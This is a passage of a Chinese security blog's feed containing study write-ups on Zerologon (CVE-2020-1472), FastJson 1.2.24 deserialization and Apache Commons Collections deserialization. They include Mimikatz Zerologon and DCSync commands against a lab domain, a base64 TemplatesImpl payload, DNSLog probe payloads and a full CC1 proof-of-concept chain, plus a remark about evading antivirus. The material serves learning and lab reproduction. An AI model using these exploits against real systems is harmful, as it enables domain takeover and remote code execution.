href="https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247487380&amp;idx=2&amp;sn=2723d6d6eca3b3b1460dbe7bedb860ca&amp;chksm=eafa47d8dd8dcece7b0b01c331f750da994e7c6483e9839e2752ea830b59c72c72c9ea031e68&amp;mpshare=1&amp;scene=1&amp;srcid=0915K0mh2x5HCSuWhim4a8lF&amp;sharer_sharetime=1600248655858&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=3f730bd43b5106bfcfc536175a58a4f9591d1b260793c8320f040377f9e45b3f7b1781c4506ae0c3fc8415c1b2f8d9435f1fded377146fc29d269caa557b9830bdeeb81c8686131660911572d1ada5ea854d9300322be78d605613b9f1bd019df785e35a2a1741b74c3f37802d1c6fd84fd1b01daa33a9697d6a2b667626c94c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=Ay8gAj7ggbwWBs6jC8EQrCI%3D&amp;pass_ticket=31feuN9eshIctUXUsMy%2Fwuj0mP%2BK04tjRZZR3Gpdd1gV5CwB6kJIS0W2DnYDEWGx&amp;wx_header=0" title="Netlogon 特权提升漏洞-CVE-2020-1472-原理分析与验证" target="_blank" rel="noopener">Netlogon 特权提升漏洞(CVE-2020-1472)原理分析与验证</a></p><p>看不懂，那咋办啊~</p><h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><p><img src="/2020/09/16/CVE-2020-1472/8.png" alt><br>上午看见发布了部分代码，下午就更新了，不给过mimikatz太敏感，后续还得想想免杀叭</p><p><img src="/2020/09/16/CVE-2020-1472/mimikatz.gif" alt></p><p>更新一下部分Mimikatz命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mimikatz zerologon域：hacke.testlab</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:HACKE.testlab /dc:dc.hacke.testlab /user:krbtgt /authuser:dc$ /authdomain:HACKE /authpassword:&quot;&quot; /authntlm #空密码尝试</span><br><span class="line"></span><br><span class="line">privilge::debug #权限提升</span><br><span class="line"></span><br><span class="line">lsadump::zerologon /target:dc.hacke.testlab /account:dc$ #这个是poc</span><br><span class="line"></span><br><span class="line">lsadump::zerologon /target:dc.hacke.testlab /account:dc$ /exploit  #这个是exp</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:HACKE.LOCAL /dc:dc.hacke.testlab /user:krbtgt /authuser:dc$ /authdomain:HACKE /authpassword:&quot;&quot; /authntlm #再次空密码尝试</span><br><span class="line"></span><br><span class="line">lsadump::postzerologon /target:192.168.43.100 /account:dc$ #恢复密码</span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://github.com/DimopoulosElias/SimpleMimikatzObfuscator" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleMimikatzObfuscator</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2020年9月16日 星期二  阴&lt;/p&gt;
&lt;p&gt;深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FastJson&lt;1.2.24反序列化漏洞分析</title>
    <link href="http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/"/>
    <id>http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/</id>
    <published>2020-08-27T05:39:11.000Z</published>
    <updated>2020-08-30T06:00:17.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h1><p>FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们的对象序列化成Json，也可以将我们恶意的Json反序列化为恶意对象，从而执行命令。</p><h1 id="FastJson的序列化与反序列化"><a href="#FastJson的序列化与反序列化" class="headerlink" title="FastJson的序列化与反序列化"></a>FastJson的序列化与反序列化</h1><p>新建maven项目，修改pom.xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2.23&lt;/version&gt;&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>首先我们创建一个我们需要序列化的对象，对象属性为私有，设置好set/get方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    @JSONField(name = &quot;AGE&quot;)</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;FULL NAME&quot;)</span><br><span class="line">    private String fullName;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;DATE OF BIRTH&quot;)</span><br><span class="line">    private Date dateOfBirth;</span><br><span class="line"></span><br><span class="line">    public Person(int age, String fullName, Date dateOfBirth) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.fullName= fullName;</span><br><span class="line">        this.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getFullName() &#123;</span><br><span class="line">        return fullName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setFullName(String fullName) &#123;</span><br><span class="line">        this.fullName = fullName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来我们用FastJson来序列化对象，利用其内置的toJSONString方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.PipedWriter;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Person John = new Person(15, &quot;John Doe&quot;, new Date());</span><br><span class="line">        //序列化</span><br><span class="line">        String jsonOutput= JSON.toJSONString(John);</span><br><span class="line">        System.out.println(jsonOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;AGE&quot;:15,&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>我们也可以将上述的JSON格式反序列化为对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//反序列化</span><br><span class="line">Object obj1 = JSON.parseObject(jsonOutput);</span><br><span class="line">System.out.println(obj1);</span><br><span class="line">System.out.println(obj1.getClass().getName());</span><br></pre></td></tr></table></figure></p><p>输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;,&quot;AGE&quot;:15&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure></p><p>同时我们可以通过FastJson的@type指定我们需要反序列化的类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String myJSON = &quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;AGE\&quot;:15,\&quot;dateOfBirth\&quot;:1598336520384,\&quot;fullName\&quot;:\&quot;sher10ck\&quot;&#125;&quot;;</span><br><span class="line">        JSONObject Ps = JSON.parseObject(myJSON);</span><br><span class="line">        System.out.println(Ps);</span><br><span class="line">        System.out.println(&quot;result =&gt; &quot; + Ps.get(&quot;fullName&quot;));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Person&quot;,&quot;fullName&quot;:&quot;John Doe&quot;,&quot;dateOfBirth&quot;:1598336520384,&quot;AGE&quot;:15&#125;</span><br><span class="line">result =&gt; sher10ck</span><br></pre></td></tr></table></figure></p><p>下一步就是想办法传入我们的恶意Json</p><p>搭建环境war包：<br><a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a></p><h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p>弹出计算器payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTHBlcnNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAC3BlcnNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADwAEABAADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFQALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAAAAAQAWABcAAwABABAAGAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABkAGgACAA4AAAAEAAEAGwABABwAAAACAB0=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>运行效果：<br><img src="/2020/08/27/FastJson-1-2-24/calc.png" alt></p><h1 id="DNSLOG检测"><a href="#DNSLOG检测" class="headerlink" title="DNSLOG检测"></a>DNSLOG检测</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_45714179/article/details/103237473" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45714179/article/details/103237473</a></p><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p><p><a href="https://yoga7xm.top/2019/07/20/fastjson/" target="_blank" rel="noopener">https://yoga7xm.top/2019/07/20/fastjson/</a></p><p><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p><p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p><p><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FastJson&quot;&gt;&lt;a href=&quot;#FastJson&quot; class=&quot;headerlink&quot; title=&quot;FastJson&quot;&gt;&lt;/a&gt;FastJson&lt;/h1&gt;&lt;p&gt;FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections漏洞组件反序列化分析</title>
    <link href="http://sherlocz.github.io/2020/08/04/Apache-Commons-Collections%E6%BC%8F%E6%B4%9E%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://sherlocz.github.io/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/</id>
    <published>2020-08-04T09:23:14.000Z</published>
    <updated>2020-08-07T13:37:25.681Z</updated>
    
    <content type="html"><![CDATA[<p>其实漏洞原理都看懂了，但是去看其他框架的反序列化漏洞还是有点迷糊，还是做下笔记叭！</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，是一个很常见的库，这个漏洞影响了后续很多的框架（如Weblogic、Shiro、JBoss、WebSphere等）</p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射为JAVA中特有的机制，可以通过反射调用任意类的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class JavaDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class cl = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Method method = cl.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">        Method execmethod = cl.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        Object runtime = method.invoke(cl);</span><br><span class="line">        execmethod.invoke(runtime,&quot;calc.exe&quot;);</span><br><span class="line">//Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/invoke.png" alt></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>反序列化是由于我们readObject的对象重写了readObject方法，若我们重写过后的这个方法包含恶意代码则会执行，在平时开发的时候开发人员一般不会让readObject直接利用Runtime执行命令。</p><p>所以我们要找到一个重写了readObject的类，并且我们通过这个类的其他方调用Runtime来实现执行命令。</p><h1 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>idea新建maven工程，pom.xml中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/jar.png" alt><br>会直接给我们导入commons collections组件，这里若是报错了估计是网络的原因无法访问maven的中央仓库，这时我们在maven的setting.xml中设置为阿里仓库，再配置下项目调用的setting.xml文件就行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">     &lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">     &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; </span><br><span class="line">     &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class="line">   &lt;/mirror&gt;</span><br><span class="line">   &lt;mirror&gt;</span><br><span class="line">     &lt;id&gt;nexus-public-snapshots&lt;/id&gt;</span><br><span class="line">     &lt;mirrorOf&gt;public-snapshots&lt;/mirrorOf&gt;</span><br><span class="line">     &lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/snapshots/&lt;/url&gt;</span><br><span class="line">   &lt;/mirror&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/setting.png" alt></p><h1 id="POC代码"><a href="#POC代码" class="headerlink" title="POC代码"></a>POC代码</h1><p>jdk1.7环境下运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        File f = new File(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        // 从文件payload.bin中读取数据</span><br><span class="line">        FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(fi);</span><br><span class="line">        //服务端反序列化</span><br><span class="line">        String s = (String) fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/poc.png" alt></p><p>代码有点长，我们拆分成几个部分</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" 